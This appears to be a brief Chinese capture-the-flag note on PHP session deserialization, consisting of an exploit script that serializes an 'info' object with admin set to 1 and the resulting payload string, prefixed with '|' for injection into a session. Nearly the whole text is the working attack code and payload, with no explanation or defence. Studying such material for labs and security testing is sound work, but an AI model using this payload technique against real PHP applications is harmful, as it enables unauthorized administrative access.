## PHPsession反序列化
exp:
```PHP
<?php

class info{
    public $admin;
    public $username;
    public $motto;

}

$pop = new info();
$pop->admin = 1;
echo serialize($pop);
```
payload：
```PHP
|O:4:"info":3:{s:5:"admin";i:1;s:8:"username";N;s:5:"motto";N;}
```

